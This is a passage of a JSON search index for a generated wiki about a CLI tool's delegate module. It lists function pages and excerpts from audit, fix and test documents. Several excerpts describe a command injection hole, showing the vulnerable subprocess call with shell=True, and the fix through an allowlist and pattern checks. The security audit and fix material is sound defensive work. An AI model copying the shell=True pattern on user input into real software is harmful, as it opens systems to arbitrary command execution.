\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>group tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/rundiscovery/","title":"_run_discovery()","text":"<p>Type: tech_term | Mentioned in: 22 documents | First seen: 2026-02-13</p>"},{"location":"entities/rundiscovery/#documents-22","title":"Documents (22)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...<code>tasks.py</code> | | FILE_PATH | 115 | <code>emdx/commands/delegate.py</code> | | FUNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLAG | 27 | <code>--each</code>, <code>--json</code> | | SUMMARY_NOISE | 12 | <code>summary fixed</code>, <code>summary added</code> | | TYPE_ANNOT | 8 | <code>dict[str, any]</code>, `list[dict[...</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made</p> <p>...iscovery_command()` function (command parsing and allowlist validation)</p> </li> <li>Removed <code>_run_discovery()</code> function (shell command execution and output parsing)</li> <li>Removed <code>--each</code> and <code>--do</code> CLI option parameters from the <code>delegate()</code> function</li> <li> <p>Removed <code>--each</code>/<code>--do</code> f...</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Vulnerability Details</p> </li> <li>File: <code>emdx/commands/delegate.py</code></li> <li>Function: <code>_run_discovery()</code> (line 141-166)</li> <li> <p>Severity: HIGH/CRITICAL</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>...| None`</p> </li> <li><code>_safe_update_task()</code> \u2192 <code>None</code></li> <li><code>_safe_update_execution()</code> \u2192 <code>None</code></li> <li><code>_run_discovery()</code> \u2192 <code>list[str]</code></li> <li><code>_load_doc_context()</code> \u2192 <code>str</code></li> <li><code>_run_single()</code> \u2192 <code>tuple[int | None, int | None]</code></li> <li><code>_run_parallel()</code> \u2192 <code>list[int]</code></li> <li> <p><code>_run_chain()</code> \u2192 <code>list[int]</code></p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Summary</p> <p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling arbitrary command execution.</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Vulnerability Details</p> <p>The original <code>_run_discovery()</code> function passed user input directly to subprocess with <code>shell=True</code>:</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each</p> </li> </ul>"},{"location":"entities/rundiscovery/#location","title":"Location","text":""},{"location":"entities/rundiscovery/#changes-made","title":"Changes Made","text":""},{"location":"entities/rundiscovery/#1-fixed-command-injection-in-_run_discovery-critical","title":"1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)","text":"<p>File: <code>emdx/commands/delegate.py</code></p> <p>Before: ```python result = subprocess.run(     command,     shell=True,  # DANGEROUS     capture_output=True,     ... ) ...</p> <ul> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in the <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code>.</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was using <code>shell=True</code> with user input from the <code>--each</code> flag:</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Issue</p> <p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> used <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Code Changes (<code>emdx/commands/delegate.py</code>)</p> <ol> <li>Updated <code>_run_discovery()</code>:</li> </ol> </li> <li>Now calls validation before execution</li> <li> <p>Uses <code>shell=False</code> to prevent shell injection</p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery   Section: The Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py:141</code> was using <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function used <code>shell=True</code> with user-provided input from the <code>--each</code> flag, allowing arbitrary command execution:</p> </li> <li> <p>#6250 Delegate: Security Fix - Command Injection in --each   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:141</code> - <code>_run_discovery()</code> function</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Vulnerability</p> <p>Before this fix, the <code>_run_discovery()</code> function at line 144 used <code>shell=True</code>:</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery()</code> function) Severity: HIGH Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>, allowing command injection attacks.</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Files Changed</p> <ol> <li>emdx/commands/delegate.py</li> </ol> </li> <li>Added <code>shlex</code> import</li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset allowlist</li> <li>Added <code>_validate_discovery_command()</code> function for security validation</li> <li> <p>Modified <code>_run_discovery()</code> to use the new validation</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Recommended Action Plan</p> </li> <li>Fix command injection in <code>_run_discovery()</code></li> <li>Fix test coverage configuration - verify pytest-cov setup</li> <li>Update Execution dataclass to include missing columns</li> <li> <p>Fix heartbeat queries to handle...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 2. UNTESTED PUBLIC FUNCTIONS IN EXISTING MODULES</p> ...tion Severity Recommended Test <code>_run_discovery()</code> \ud83d\udfe1 HIGH Test command execution and item parsing <code>_load_doc_context()</code> \ud83d\udfe1 HIGH Test document loading with/without prompt <code>_run_single()</code> \ud83d\udd34 CRITICAL ... </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Recommendations</p> </li> <li> <p>Fix command injection in <code>_run_discovery()</code> - This is the only critical issue requiring immediate attention</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Delegate Integration (emdx/commands/delegate.py)</p> <p>...ntially with output piping | | <code>_resolve_task()</code> | Convert doc IDs to content | | <code>_run_discovery()</code> | Run shell cmd for item discovery |</p> </li> </ul>"},{"location":"entities/rundiscovery/#the-vulnerability-cve-worthy","title":"The Vulnerability (CVE-worthy)","text":"<p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/rundiscovery/#phase-1-critical-fixes-1-3-days","title":"Phase 1: Critical Fixes (1-3 days)","text":""},{"location":"entities/rundiscovery/#immediate-actions","title":"Immediate Actions","text":""},{"location":"entities/rundiscovery/#related-entities","title":"Related Entities","text":"<ul> <li><code>shlex</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>--allow-shell</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>safe_discovery_commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.1)</li> <li><code>/usr/bin/fd</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>security fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (15 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/runparallel/","title":"_run_parallel","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/runparallel/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...have no CLI. | | 2 | Parallel orchestration (ThreadPoolExecutor) | 639\u2013861 | <code>_run_parallel</code> spawns N threads, each running <code>_run_single</code>. Hooks fire per-session, not per-batch \u2014 there's no hook event for \"I want to run 5 Claude sessions in parallel.\" | | 3...</p> </li> <li> <p>#6575 Delegate: Add a one-line comment above _print_doc_content in delegate.   Section: Delegate: Add Comment Above _print_doc_content</p> <p>...is called from:</p> </li> <li><code>_run_single</code> at line 575 (prints the saved document content)</li> <li> <p><code>_run_parallel</code> at lines 822 and 850 (prints synthesis results or individual task results)</p> </li> <li> <p>#6568 Delegate: Review the synthesis prompt construction in _run_parallel \u2014  [2/3]   Section: Overview</p> <p>I traced the synthesis prompt construction in <code>_run_parallel</code> (lines 636-861 of <code>emdx/commands/delegate.py</code>) to identify any paths where content could be doubled.</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> </li> </ul> <pre><code>def _run_parallel(\n    tasks: list[str],\n    tags: list[str],\n    title: str | None,\n    jobs: int | None,\n    ...\n    source_doc_id: int...\n\n- **#6495** None Type Analysis [1/7]\n  *Section: 1. `_run_parallel` \u2014 `jobs` parameter*\n  &gt; **Current signature (line 643):**\n```python\ndef _run_parallel(\n    ...\n    jobs: int | None,\n    ...\n)\n</code></pre> <ul> <li>#6481 Delegate: Kink 4: Make delegate --synthesize resilient to agent failur [1/3] <p>Updated <code>_run_single</code> failure return (line 512-517)</p> </li> </ul> <p>When a task fails, now returns a <code>SingleResult</code> with <code>success=False</code> and the error message:</p> <pre><code>if not result.success:\n    sys.stderr.write(f\"delegate: task failed: {result.error_message}\\n\"...\n\n- **#6443** Delegate: Fix orphan worktrees when using --pr flag\n  *Section: Changes Made*\n  &gt; #### 1. `_run_parallel`'s `run_task` finally block (lines 516-541)\nChanged from:\n```python\n# Clean up worktree unless --pr (keep for the PR branch)\nif task_worktree_path and not pr:\n    cleanup_worktree(task_worktree_path)\n</code></pre> <ul> <li>#6442 Delegate: Fix draft default mismatch in internal functions   Section: Fix <ol> <li><code>_run_single</code> (line 311): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></li> </ol> </li> <li><code>_run_parallel</code> (line 462): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></li> <li> <p><code>_run_chain</code> (line 631): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made</p> <p>...to include <code>--draft</code> by default</p> </li> <li>Added <code>draft</code> parameter to <code>_run_single()</code>, <code>_run_parallel()</code>, and <code>_run_chain()</code> functions</li> <li> <p>Updated known_flags guard to include <code>--draft</code> and <code>--no-draft</code></p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: What It Actually Does (819 LOC)</p> <ol> <li>Parallel execution (<code>_run_parallel</code>) - 115 LOC</li> </ol> </li> <li>ThreadPoolExecutor with up to 10 workers</li> <li>Optional synthesis via additional Claude call</li> <li> <p>Per-task worktrees if requested</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...gle task execution via UnifiedExecutor</p> </li> <li>TestRunParallel (4 tests): Tests for <code>_run_parallel</code> - parallel task execution including synthesize and worktree</li> <li> <p>TestRunChain (4 tests): Tests for <code>_run_chain</code> - sequential task execution with output piping</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> </li> <li>Creates parent \"group\" task (lines 283-290):</li> <li> <p><code>task_type=\"group\"</code>, represents the batch</p> </li> <li> <p>Each parallel sub-task gets its own task via `_run_si...</p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Test Coverage</p> <p>..._run_single: 4 tests covering success, failure, PR flag, working directory</p> </li> <li>_run_parallel: 4 tests covering parallel success, synthesis, all failures, worktree isolation</li> <li>_run_chain: 4 tests covering chain success, output piping, failure abort, PR...</li> </ul>"},{"location":"entities/runparallel/#function-_run_parallel-lines-638-861","title":"Function: <code>_run_parallel</code> (lines 638-861)","text":""},{"location":"entities/runparallel/#parallel-tasks-_run_parallel","title":"Parallel Tasks (<code>_run_parallel</code>)","text":""},{"location":"entities/runparallel/#related-entities","title":"Related Entities","text":"<ul> <li><code>_run_chain</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>_load_doc_context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>source_path</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>_validate_pr_and_warn</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/runsingle/","title":"_run_single","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/runsingle/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>Fix: In <code>emdx/commands/delegate.py</code> <code>_run_parallel()</code>, the synthesis <code>_run_single</code> call at line ~1008 was missing the <code>limit</code> parameter. Individual parallel tasks correctly received <code>limit</code> (line 890), but when <code>--synthesize</code> was used, the synthes...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...(ThreadPoolExecutor) | 639\u2013861 | <code>_run_parallel</code> spawns N threads, each running <code>_run_single</code>. Hooks fire per-session, not per-batch \u2014 there's no hook event for \"I want to run 5 Claude sessions in parallel.\" | | 3 | Worktree creation (single task)** | 1114...</p> </li> <li> <p>#6575 Delegate: Add a one-line comment above _print_doc_content in delegate.   Section: Delegate: Add Comment Above _print_doc_content</p> </li> <li> <p>#6569 Delegate: Check the KB save path \u2014 trace from UnifiedExecutor output t [3/3]   Section: 3. Fallback Save Check (<code>delegate.py:556-565</code>)</p> <p>After the executor returns, <code>_run_single</code> checks if the agent saved successfully:</p> </li> <li> <p>#6544 Delegate Enhancement Gameplans [4/5]   Section: Implementation Using Existing Infrastructure</p> <p>The synthesis uses the existing <code>_run_single</code> pattern from delegate.py:</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> </li> <li> <p>#6481 Delegate: Kink 4: Make delegate --synthesize resilient to agent failur [1/3]</p> <p>Extended <code>SingleResult</code> dataclass (line 433-441)</p> </li> </ul> <p>Added two new fields to track failure state: - <code>success: bool = True</code> - Whether the task completed successfully - <code>error_message: str | None = None</code> - Error message if task failed</p> <p>```python @dataclas...</p> <ul> <li>#6442 Delegate: Fix draft default mismatch in internal functions   Section: Fix <ol> <li><code>_run_single</code> (line 311): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></li> </ol> </li> <li><code>_run_parallel</code> (line 462): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></li> <li> <p><code>_run_chain</code> (line 631): <code>draft: bool = True</code> \u2192 <code>draft: bool = False</code></p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made</p> <p>...GENERIC<code>constant to include</code>--draft` by default</p> </li> <li>Added <code>draft</code> parameter to <code>_run_single()</code>, <code>_run_parallel()</code>, and <code>_run_chain()</code> functions</li> <li> <p>Updated known_flags guard to include <code>--draft</code> and <code>--no-draft</code></p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: What It Actually Does (819 LOC)</p> <ol> <li>Single task execution (<code>_run_single</code>) - 70 LOC</li> </ol> </li> <li>Creates task record</li> <li>Builds prompt with save instruction</li> <li>Calls <code>UnifiedExecutor</code></li> <li> <p>Updates task with result</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> </li> <li>TestRunSingle (3 tests): Tests for <code>_run_single</code> - single task execution via UnifiedExecutor</li> <li> <p>TestRunParallel (4 tests): Tests for <code>_run_parallel</code> - parallel task execution including synthesize and worktree -...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> </li> <li>Creates task BEFORE execution (lines 200-209):</li> <li><code>task_type=\"single\"</code>, <code>status=\"active\"</code></li> <li> <p>Stores <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>tags</code>, <code>prompt</code></p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Test Coverage</p> </li> <li>_run_single: 4 tests covering success, failure, PR flag, working directory</li> <li>_run_parallel: 4 tests covering parallel success, synthesis, all failures, worktree isolation...</li> </ul>"},{"location":"entities/runsingle/#task","title":"Task","text":"<p>Add a one-line comment above <code>_print_doc_content</code> in <code>delegate.py</code> explaining that <code>_run_single</code> already handles printing.</p>"},{"location":"entities/runsingle/#function-_run_single-lines-472-601","title":"Function: <code>_run_single</code> (lines 472-601)","text":"<p>```python def _run_single(     prompt: str,     tags: list[str],     title: str | None,     model: str | None,     quiet: bool,     pr: bool = False...</p>"},{"location":"entities/runsingle/#core-execution-functions","title":"Core Execution Functions","text":""},{"location":"entities/runsingle/#single-task-_run_single","title":"Single Task (<code>_run_single</code>)","text":""},{"location":"entities/runsingle/#core-execution-functions_1","title":"Core Execution Functions","text":""},{"location":"entities/runsingle/#related-entities","title":"Related Entities","text":"<ul> <li><code>_run_chain</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>_load_doc_context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>_validate_pr_and_warn</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>_save_output_fallback</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/safediscoverycommands/","title":"safe_discovery_commands","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/safediscoverycommands/#documents-9","title":"Documents (9)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made </li> <li>Removed the <code>SAFE_DISCOVERY_COMMANDS</code> frozenset (allowlist of safe shell commands)</li> <li>Removed <code>_validate_discovery_command()</code> function (command parsing and allowlist validation)</li> <li> <p>Removed `_run_discovery...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <ol> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist containing safe file discovery commands:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>ls</code>, <code>eza</code>, <code>exa</code>, <code>rg</code>, <code>git</code>, <code>locate</code>, <code>tree</code>, <code>echo</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, <code>seq</code></p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>After:</p> </li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> <li>Added <code>_validate_discovery_command()</code> function that:</li> <li> <p>Parses command with <code>shlex.split()</code>    -...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Changes Made</p> <ul> <li><code>emdx/commands/delegate.py</code>: Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist, <code>DANGEROUS_PATTERNS</code> regex, and <code>_validate_discovery_command()</code> validation function</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 32 comprehensive security tests</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Fix Implementation</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>grep</code>, <code>ls</code>, <code>eza</code></li> <li> <p><code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>uniq</code>, <code>wc</code>, <code>echo</code>, <code>printf</code></p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Fix Applied</p> <ol> <li>Created <code>SAFE_DISCOVERY_COMMANDS</code> allowlist - Only permits known-safe file discovery commands: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code></li> </ol> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Solution</p> <ol> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist:</li> </ol> </li> <li>fd, find, ls, git, rg, grep, eza, tree, locate</li> <li> <p>Commands not in allowlist are rejected</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Code Changes (<code>emdx/commands/delegate.py</code>)</p> <ol> <li>Added command validation - Created <code>SAFE_DISCOVERY_COMMANDS</code> frozenset with allowed commands:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>ls</code>, <code>eza</code>, <code>exa</code></p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Files Changed</p> <ol> <li>emdx/commands/delegate.py</li> </ol> </li> <li>Added <code>shlex</code> import</li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset allowlist</li> <li>Added <code>_validate_discovery_command()</code> function for security validation</li> <li>Modified <code>_run_discovery()</code> to use the new validation</li> </ul>"},{"location":"entities/safediscoverycommands/#emdxcommandsdelegatepy","title":"emdx/commands/delegate.py","text":""},{"location":"entities/safediscoverycommands/#1-command-allowlist","title":"1. Command Allowlist","text":"<p>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset containing only file-listing commands:</p>"},{"location":"entities/safediscoverycommands/#related-entities","title":"Related Entities","text":"<ul> <li><code>added</code>safe_discovery_commands<code>allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>shlex</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>echo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>after (secure):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>--allow-shell</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>head</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>_validate_discovery_command()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, 